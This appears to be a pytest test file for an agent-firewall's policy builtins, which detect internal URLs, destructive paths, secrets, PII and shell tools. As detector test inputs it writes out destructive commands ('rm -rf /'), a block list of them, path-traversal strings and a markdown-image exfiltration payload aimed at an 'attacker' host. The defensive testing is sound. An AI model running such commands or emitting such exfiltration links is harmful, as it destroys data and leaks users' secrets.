"""Tests for policy-expression builtins (§3.5 + §6.2 of
AGENT_FIREWALL_SPEC.md).

Two flavors covered:

  - Stateless builtins (regex, URL, path, detector wrappers): pure
    functions, asserted directly.
  - History-backed builtins (session/trace/agent aggregates):
    seed an in-memory DB with spans, assert the bound builtin
    returns the expected aggregate. Cache-isolation between tests
    handled via ``reset_cache_for_tests()``.

Rule 7 is asserted across the board: every builtin returns a safe
default on bad inputs (None, empty, malformed) — none raise.
"""

from __future__ import annotations

from datetime import datetime, timedelta, timezone

import pytest

from db import Database
from firewall import builtins as fb


@pytest.fixture(autouse=True)
def _clear_cache():
    fb.reset_cache_for_tests()
    yield
    fb.reset_cache_for_tests()


# ----- Stateless: URL helpers -----


def test_url_host_basic():
    assert fb.url_host("https://api.example.com/v1/foo") == "api.example.com"
    assert fb.url_host("http://Example.COM:8080/") == "example.com"


def test_url_host_handles_garbage():
    assert fb.url_host(None) == ""
    assert fb.url_host("") == ""
    assert fb.url_host("not a url") == ""


def test_url_in_allowlist_exact_match():
    al = ["api.acme.com", "docs.acme.com"]
    assert fb.url_in_allowlist("https://api.acme.com/v1", al)
    assert not fb.url_in_allowlist("https://other.com", al)
    # Subdomain of allowed host but no wildcard → not in allowlist
    assert not fb.url_in_allowlist("https://staging.api.acme.com", al)


def test_url_in_allowlist_subdomain_wildcard():
    al = [".acme.com"]
    assert fb.url_in_allowlist("https://api.acme.com", al)
    assert fb.url_in_allowlist("https://staging.api.acme.com", al)
    # The bare domain itself matches a subdomain wildcard
    assert fb.url_in_allowlist("https://acme.com", al)
    assert not fb.url_in_allowlist("https://attacker.com", al)


def test_url_in_allowlist_safe_on_garbage():
    assert not fb.url_in_allowlist(None, ["x"])
    assert not fb.url_in_allowlist("https://x.com", None)
    assert not fb.url_in_allowlist("https://x.com", [])


def test_is_internal_url_localhost():
    assert fb.is_internal_url("http://localhost:8080/")
    assert fb.is_internal_url("http://127.0.0.1/")
    assert fb.is_internal_url("http://0.0.0.0/")


def test_is_internal_url_rfc1918():
    assert fb.is_internal_url("http://10.0.0.5/")
    assert fb.is_internal_url("http://172.16.5.10/")
    assert fb.is_internal_url("http://192.168.1.1/")


def test_is_internal_url_link_local():
    assert fb.is_internal_url("http://169.254.169.254/")  # AWS metadata
    assert fb.is_internal_url("http://metadata.google.internal/")  # GCP metadata


def test_is_internal_url_file_scheme():
    assert fb.is_internal_url("file:///etc/passwd")


def test_is_internal_url_public_not_flagged():
    assert not fb.is_internal_url("https://api.openai.com/")
    assert not fb.is_internal_url("https://github.com/foo/bar")


def test_is_internal_url_safe_on_bad_input():
    assert not fb.is_internal_url(None)
    assert not fb.is_internal_url("")
    assert not fb.is_internal_url("not a url")


# ----- Stateless: path safety -----


def test_is_destructive_path_root():
    assert fb.is_destructive_path("/")
    assert fb.is_destructive_path("/etc/passwd")
    assert fb.is_destructive_path("/usr/local/bin")
    assert fb.is_destructive_path("/var/log/messages")


def test_is_destructive_path_traversal():
    assert fb.is_destructive_path("../../../etc/passwd")
    assert fb.is_destructive_path("foo/../../bar")
    assert fb.is_destructive_path("..\\Windows\\System32")


def test_is_destructive_path_windows_root():
    assert fb.is_destructive_path("C:\\Windows\\System32")


def test_is_destructive_path_legit_paths_pass():
    assert not fb.is_destructive_path("/tmp/cache")
    assert not fb.is_destructive_path("./local/file.txt")
    assert not fb.is_destructive_path("data/2026-05-07.json")


def test_is_destructive_path_safe_on_garbage():
    assert not fb.is_destructive_path(None)
    assert not fb.is_destructive_path("")


# ----- Stateless: contains_any / len_chars / entropy -----


def test_contains_any():
    assert fb.contains_any("rm -rf /", ["rm -rf", "mkfs"])
    assert not fb.contains_any("ls -la", ["rm -rf", "mkfs"])
    assert not fb.contains_any(None, ["rm"])
    assert not fb.contains_any("hello", None)
    assert not fb.contains_any("hello", [])


def test_len_chars():
    assert fb.len_chars("hello") == 5
    assert fb.len_chars(None) == 0
    assert fb.len_chars("") == 0


def test_entropy_buckets():
    # Prose: <5 bits/char
    assert fb.entropy("the quick brown fox") < 5.0
    # Random base64-ish: >4.5 bits/char
    assert fb.entropy("AKIAIOSFODNN7EXAMPLE") > 3.5
    assert fb.entropy(None) == 0.0


# ----- Stateless: detector wrappers -----


def test_looks_like_secret_wrapper():
    assert fb.looks_like_secret("ghp_" + "a" * 36)
    assert not fb.looks_like_secret("hello world")
    assert not fb.looks_like_secret(None)


def test_has_pii_wrapper():
    assert fb.has_pii("call me at (415) 555-1234")
    assert fb.has_pii("SSN: 123-45-6789")
    assert not fb.has_pii("hello world")


def test_has_image_markdown_exfil_wrapper():
    assert fb.has_image_markdown_exfil(
        "![](https://attacker/?d=secret)"
    )
    assert not fb.has_image_markdown_exfil("![logo](https://x.com/y.png)")


def test_redact_pii_replaces_matches():
    out = fb.redact_pii("My SSN is 123-45-6789, please redact.")
    assert "123-45-6789" not in out
    assert "[REDACTED:us_ssn]" in out


def test_redact_pii_handles_secrets():
    out = fb.redact_pii("token: ghp_" + "x" * 36)
    assert "ghp_" not in out  # the value was replaced
    assert "[REDACTED:github_pat]" in out


def test_redact_pii_safe_on_none():
    assert fb.redact_pii(None) == ""
    assert fb.redact_pii("") == ""


# ----- History-backed builtins (DB-bound) -----


def _seed_span(db: Database, span_id: str, trace_id: str, *, session_id=None,
               tokens_input=10, tokens_output=20, cost_usd=0.001,
               started_at=None, span_type="llm", tool_name=None):
    if started_at is None:
        started_at = datetime.now(timezone.utc).replace(tzinfo=None)
    db.execute(
        """
        INSERT INTO spans (
            id, trace_id, parent_span_id, type, name, started_at,
            tokens_input, tokens_output, cost_usd, session_id, tool_name
        ) VALUES (?, ?, NULL, ?, ?, ?, ?, ?, ?, ?, ?)
        """,
        [span_id, trace_id, span_type, "test", started_at,
         tokens_input, tokens_output, cost_usd, session_id, tool_name],
    )


def _seed_trace(db: Database, trace_id: str, *, name="bot", session_id=None,
                started_at=None):
    if started_at is None:
        started_at = datetime.now(timezone.utc).replace(tzinfo=None)
    db.execute(
        "INSERT INTO traces (id, name, started_at, session_id) VALUES (?, ?, ?, ?)",
        [trace_id, name, started_at, session_id],
    )


def test_session_total_tokens():
    db = Database(duckdb_path=":memory:", sqlite_path=":memory:")
    try:
        _seed_trace(db, "t1", session_id="sess-A")
        _seed_span(db, "s1", "t1", session_id="sess-A", tokens_input=100, tokens_output=50)
        _seed_span(db, "s2", "t1", session_id="sess-A", tokens_input=200, tokens_output=80)
        # Different session — must not contribute
        _seed_span(db, "s3", "t1", session_id="sess-B", tokens_input=999, tokens_output=999)

        h = fb.build_history_builtins(db)
        assert h["session_total_tokens"]("sess-A") == 100 + 50 + 200 + 80
        assert h["session_total_tokens"]("sess-B") == 999 + 999
        assert h["session_total_tokens"](None) == 0
    finally:
        db.close()


def test_session_total_cost():
    db = Database(duckdb_path=":memory:", sqlite_path=":memory:")
    try:
        _seed_trace(db, "t1", session_id="sess-X")
        _seed_span(db, "s1", "t1", session_id="sess-X", cost_usd=0.5)
        _seed_span(db, "s2", "t1", session_id="sess-X", cost_usd=1.25)

        h = fb.build_history_builtins(db)
        assert h["session_total_cost"]("sess-X") == pytest.approx(1.75)
        assert h["session_total_cost"]("missing") == 0.0
    finally:
        db.close()


def test_trace_total_cost():
    db = Database(duckdb_path=":memory:", sqlite_path=":memory:")
    try:
        _seed_trace(db, "t-cost")
        _seed_span(db, "s1", "t-cost", cost_usd=0.10)
        _seed_span(db, "s2", "t-cost", cost_usd=0.20)
        h = fb.build_history_builtins(db)
        assert h["trace_total_cost"]("t-cost") == pytest.approx(0.30)
    finally:
        db.close()


def test_tool_calls_in_trace():
    db = Database(duckdb_path=":memory:", sqlite_path=":memory:")
    try:
        _seed_trace(db, "t-tools")
        _seed_span(db, "s1", "t-tools", span_type="llm")
        _seed_span(db, "s2", "t-tools", span_type="tool", tool_name="web_search")
        _seed_span(db, "s3", "t-tools", span_type="tool", tool_name="web_search")
        _seed_span(db, "s4", "t-tools", span_type="tool", tool_name="web_fetch")

        h = fb.build_history_builtins(db)
        # Total tool calls: 3
        assert h["tool_calls_in_trace"]("t-tools") == 3
        # Filtered by name: 2 web_search, 1 web_fetch
        assert h["tool_calls_in_trace"]("t-tools", "web_search") == 2
        assert h["tool_calls_in_trace"]("t-tools", "web_fetch") == 1
        # Unknown tool: 0
        assert h["tool_calls_in_trace"]("t-tools", "code_exec") == 0
        # Unknown trace: 0
        assert h["tool_calls_in_trace"]("missing") == 0
    finally:
        db.close()


def test_agent_calls_per_minute_recent():
    db = Database(duckdb_path=":memory:", sqlite_path=":memory:")
    try:
        _seed_trace(db, "t-recent", name="bot.support")
        _seed_span(db, "s1", "t-recent")  # within last 60s
        _seed_span(db, "s2", "t-recent")
        # Old span — outside the 60s window
        old = (datetime.now(timezone.utc) - timedelta(hours=1)).replace(tzinfo=None)
        _seed_span(db, "s_old", "t-recent", started_at=old)

        h = fb.build_history_builtins(db)
        assert h["agent_calls_per_minute"]("bot.support") == 2
        assert h["agent_calls_per_minute"]("missing.bot") == 0
    finally:
        db.close()


def test_agent_calls_today_excludes_yesterday():
    db = Database(duckdb_path=":memory:", sqlite_path=":memory:")
    try:
        _seed_trace(db, "t-today", name="bot.dispatcher")
        _seed_span(db, "s1", "t-today")
        # 25 hours ago — yesterday in any timezone
        yesterday = (datetime.now(timezone.utc) - timedelta(hours=25)).replace(tzinfo=None)
        _seed_span(db, "s_y", "t-today", started_at=yesterday)

        h = fb.build_history_builtins(db)
        assert h["agent_calls_today"]("bot.dispatcher") == 1
    finally:
        db.close()


def test_history_builtins_safe_on_db_error():
    """Closing the DB underneath the builtin should NOT crash — it
    returns a safe default. Rule 7."""
    db = Database(duckdb_path=":memory:", sqlite_path=":memory:")
    h = fb.build_history_builtins(db)
    db.close()
    # Now the db connection is unusable. Builtins must not raise.
    assert h["session_total_tokens"]("any") == 0
    assert h["trace_total_cost"]("any") == 0.0


# ----- Cache behavior -----


def test_history_cache_hits_within_1s():
    """Two consecutive calls with the same args should hit the cache,
    not the DB. We verify this by mutating the underlying spans
    table after the first call — the cached value should still
    return the original answer."""
    db = Database(duckdb_path=":memory:", sqlite_path=":memory:")
    try:
        _seed_trace(db, "t-cache")
        _seed_span(db, "s1", "t-cache", cost_usd=0.10)

        h = fb.build_history_builtins(db)
        first = h["trace_total_cost"]("t-cache")
        # Mutate the table — the cache should mask this
        _seed_span(db, "s2", "t-cache", cost_usd=999.0)
        second = h["trace_total_cost"]("t-cache")
        assert first == second  # cached, not refetched
    finally:
        db.close()


# ---- Cross-framework tool name detection (Slice 2 Tier 1.1) -------------


def test_is_shell_tool_openclaw():
    """OpenClaw uses 'exec' for the shell tool — Slice 1 dogfood
    discovered our OWASP rule hardcoded 'shell' and silently never
    fired. is_shell_tool() canonicalizes."""
    from firewall.builtins import is_shell_tool
    for name in ["exec", "shell", "bash", "sh", "terminal", "system"]:
        assert is_shell_tool(name), f"{name!r} should be a shell tool"


def test_is_shell_tool_framework_variants():
    from firewall.builtins import is_shell_tool
    for name in [
        "run_command", "execute_command", "run_shell", "shell_exec",
        "code_exec", "code_interpreter", "python_repl", "python_exec",
    ]:
        assert is_shell_tool(name), f"{name!r} should be a shell tool"


def test_is_shell_tool_case_insensitive():
    from firewall.builtins import is_shell_tool
    assert is_shell_tool("EXEC")
    assert is_shell_tool("Shell")
    assert is_shell_tool("  bash  ")  # also strips whitespace


def test_is_shell_tool_rejects_non_shell():
    from firewall.builtins import is_shell_tool
    for name in ["fetch", "web_search", "sql_query", "fs_read", "edit"]:
        assert not is_shell_tool(name), f"{name!r} should NOT be a shell tool"


def test_is_shell_tool_safe_on_none():
    from firewall.builtins import is_shell_tool
    assert is_shell_tool(None) is False
    assert is_shell_tool(123) is False
    assert is_shell_tool("") is False


def test_is_web_fetch_tool():
    from firewall.builtins import is_web_fetch_tool
    for name in [
        "fetch", "http_fetch", "web_fetch", "curl",
        "brave_search", "google_search", "duckduckgo_search",
    ]:
        assert is_web_fetch_tool(name), f"{name!r} should be a web fetch tool"
    assert not is_web_fetch_tool("exec")
    assert not is_web_fetch_tool("sql_query")


def test_is_db_write_tool():
    from firewall.builtins import is_db_write_tool
    for name in [
        "sql_exec", "execute_sql", "postgres_query",
        "mongo_write", "model_create", "db_write",
    ]:
        assert is_db_write_tool(name), f"{name!r} should be a db write tool"
    assert not is_db_write_tool("exec")
    assert not is_db_write_tool("fetch")


def test_is_filesystem_tool():
    from firewall.builtins import is_filesystem_tool
    for name in [
        "fs_write", "file_read", "write_file", "create_file", "edit",
    ]:
        assert is_filesystem_tool(name), f"{name!r} should be a fs tool"
    assert not is_filesystem_tool("exec")  # shell, not direct fs


def test_tool_classifiers_in_stateless_map():
    """All four classifiers must be in STATELESS_BUILTINS so the
    decide engine wires them into the simpleeval functions table.
    Without this, conditions using the classifiers parse fine in the
    validator but fail at evaluation with 'function not defined'."""
    from firewall.builtins import STATELESS_BUILTINS
    for fn_name in ("is_shell_tool", "is_web_fetch_tool",
                    "is_db_write_tool", "is_filesystem_tool"):
        assert fn_name in STATELESS_BUILTINS


def test_tool_classifier_in_real_condition():
    """End-to-end: a condition using is_shell_tool + list-membership
    (Tier 1.2 + 1.1 together) evaluates correctly. This is the
    canonical Slice 2 idiom, replacing Slice 1's verbose OR-chain."""
    from firewall.builtins import STATELESS_BUILTINS
    from simpleeval import EvalWithCompoundTypes
    funcs = {"len": len, "str": str}
    funcs.update(STATELESS_BUILTINS)
    e = EvalWithCompoundTypes(
        names={"tool_name": "exec"},
        functions=funcs,
    )
    assert e.eval("is_shell_tool(tool_name)") is True
    assert e.eval('is_shell_tool(tool_name) and tool_name in ["exec", "shell"]') is True
    # Combined with regex on a hypothetical command
    e2 = EvalWithCompoundTypes(
        names={"tool_name": "exec", "cmd": "rm -rf /etc"},
        functions=funcs,
    )
    assert e2.eval('is_shell_tool(tool_name) and regex_match(cmd, "(?i)rm\\s+-rf")') is True
